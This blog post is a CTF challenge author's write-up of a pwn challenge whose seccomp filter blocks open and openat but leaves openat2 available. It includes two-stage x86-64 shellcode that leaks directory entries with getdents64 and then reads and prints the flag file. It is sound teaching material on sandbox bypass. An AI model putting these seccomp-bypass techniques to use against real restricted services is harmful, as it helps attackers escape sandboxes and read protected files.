---
layout: post
title: "New Age - Seccomp Shellcode in Two Parts"
date: 2026-01-25
tags: [ctf, pwn, seccomp, my-challenge, shellcoding]
---

I made this challenge for 0xl4ugh CTF v5. It was a pwn challenge about seccomp and shellcode. The binary takes bytes from the player, puts them in an executable memory page, installs a seccomp filter, and runs the bytes as code.

The solver I made has two parts. The first part leaks the files in the current directory to find the unknown flag filename. The second part opens that filename, reads the flag, and prints it.

## Starting with the binary

The binary does not wait for a vulnerability. It directly gives the player a page to use as shellcode:

```
code_region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
read(0, code_region, 0x1000);

setup();
((void(*)())code_region)();
```

First, `mmap()` creates a `0x1000` byte page with read, write, and execute permissions. Then the binary reads our input into that page. After `setup()` installs the filter, it jumps to the beginning of the page and executes our bytes.

## Looking at the filter

This is the `setup()` function from Ghidra:

![The seccomp filter inside setup()](assets/new-age-seccomp-setup.png)

The filter starts with `SCMP_ACT_ALLOW`. In simple words, syscalls are allowed by default unless one of the rules matches them. The filter then adds rules that kill the thread for specific syscalls or for specific argument values.

The filter blocks the usual file-opening syscalls:

```
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(openat), 0);
```

It also blocks `execve`, `execveat`, `fork`, `vfork`, `clone`, and `clone3`. This removes the easy options. There is no opening `/bin/sh`, and there is no spawning another process.

The `read` and `write` rules are more interesting:

```
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(read), 1,
                 SCMP_A1(SCMP_CMP_LT, base + 0xC00));

seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 1,
                 SCMP_A1(SCMP_CMP_GT, base + 0x400));
```

The second argument of both syscalls is the buffer pointer. The filter does not allow `read()` to put data below `base+0xc00`, and it does not allow `write()` to take data from above `base+0x400`.

That means the two syscalls use different sides of the shellcode page:

| Operation | Restriction | Location used by the solver |
| --- | --- | --- |
| `read` | The buffer must not be below `base+0xc00` | `base+0xc00` |
| `write` | The buffer must not be above `base+0x400` | `base+0x400` |

## Finding a way to open files

The filter blocks `open` and `openat`, while **`openat2`** is still available. This gives the shellcode a way to open the current directory and later the flag file.

`openat2` is an extended version of `openat`. It receives a directory file descriptor, a path, a pointer to a `struct open_how`, and the size of that structure. When the path is relative and the directory descriptor is `AT_FDCWD`, the path is resolved from the current working directory. It does not have a normal glibc wrapper, so shellcode can call it directly using the syscall instruction [1].

Linux added `openat2` in **Linux 5.6** [1]. On x86-64, the syscall number is `437`.

So the filter still leaves a way to open files. The next problem is the flag filename. It is randomized, so I cannot put a guessed name into the second shellcode and expect it to work.

Before reading the flag, I need to find that name. The plan is now clear: open the current directory, get its file entries, print them, and use the result to identify the flag file. The syscall for getting directory entries is `getdents64`.

There is one small thing to handle before writing that shellcode. Because `mmap()` chooses the address of the shellcode page, the shellcode needs to calculate its own base address. I also need the two buffer addresses that satisfy the `read` and `write` rules.

## Getting an address for the shellcode page

Before looking at the two parts, the shellcode needs to know where it is running. `mmap(NULL, ...)` chooses the page address, so the solver cannot hardcode it.

Both solver parts use the same `call` and `pop` trick:

```
call get_pc
get_pc:
pop r15
and r15, 0xFFFFFFFFFFFFF000
```

The `call` puts an address from inside the shellcode on the stack. `pop` puts that address in `r15`. Masking the low 12 bits aligns it to the beginning of the page.

Now the solver can create the two addresses required by the filter:

```
lea r14, [r15 + 0xc00]    ; safe destination for read()
lea r13, [r15 + 0x400]    ; safe source for write()
```

From here, the two parts do different jobs.

## Part one: leaking the file names

The first part does not try to read the flag yet. Its job is to find the file name.

The shellcode first calls `openat2` on the path `.`. `-100` is `AT_FDCWD`, which means the current working directory:

```
mov rax, 437              ; openat2
mov rdi, -100             ; AT_FDCWD
lea rsi, [rip + dot]      ; "."
sub rsp, 32
mov qword ptr [rsp], 0x100000
mov qword ptr [rsp+8], 0
mov qword ptr [rsp+16], 0
mov rdx, rsp              ; struct open_how
mov r10, 24               ; sizeof(struct open_how)
syscall

dot:
.string "."
```

The return value is a file descriptor for the current directory. The solver then uses `getdents64`, syscall `217`, to read the directory entries:

```
mov rdi, rax              ; directory fd
mov rax, 217              ; getdents64
mov rsi, r14              ; base + 0xc00
mov rdx, 0x400
syscall
```

`getdents64` returns raw directory-entry records in the supplied buffer. The records contain names and other information about the entries. For this challenge, I did not need a full parser. Printing the returned bytes was enough to see the file names.

The returned byte count is in `rax`. The data is currently in the read-safe area, but `write()` cannot use that address. So the solver copies the bytes to `base+0x400`:

```
mov rcx, rax
mov rdi, r13              ; base + 0x400
mov rsi, r14              ; base + 0xc00
rep movsb
```

After the copy, it prints the directory data:

```
mov rdx, rax              ; number of bytes returned
mov rax, 1                ; write
mov rdi, 1                ; stdout
mov rsi, r13              ; base + 0x400
syscall
```

That finishes the first part. It leaks the directory contents and gives us the randomized flag filename.

## Part two: getting the flag

Now that the filename is known, the second part can open it with the same syscall that was left available: `openat2`.

This time, the path points to the flag file and the `open_how` flags are zero, meaning read-only:

```
mov rax, 437              ; openat2
mov rdi, -100             ; AT_FDCWD
lea rsi, [rip + filename]
sub rsp, 64
mov qword ptr [rsp], 0    ; O_RDONLY
mov qword ptr [rsp+8], 0
mov qword ptr [rsp+16], 0
mov rdx, rsp
mov r10, 24
syscall
```

The returned file descriptor is passed to `read()`. The destination must be `base+0xc00` because the filter kills a read into a lower address:

```
mov rdi, rax
mov rax, 0                ; read
mov rsi, r14              ; base + 0xc00
mov rdx, 256
syscall
```

The flag bytes are now in the read-safe area. The same copy as before moves them to the write-safe area:

```
mov rcx, rax
mov rdi, r13              ; base + 0x400
mov rsi, r14              ; base + 0xc00
rep movsb
```

Finally, the solver writes the returned number of bytes to stdout and exits:

```
mov rdx, rax
mov rax, 1                ; write
mov rdi, 1                ; stdout
mov rsi, r13
syscall

mov rax, 60               ; exit
xor rdi, rdi
syscall
```

## TL;DR

The challenge starts by giving the player executable shellcode, but then tries to limit what that shellcode can do with seccomp. The solve relies on `openat2` being available while `open` and `openat` are blocked.

The unknown filename made the solve a two-step process. The first solver opened the current directory and used `getdents64` to leak the names. The second solver used the discovered name with `openat2`, read the flag, moved it into the allowed write area, and printed it.

## References

1. [Linux `openat2(2)` manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)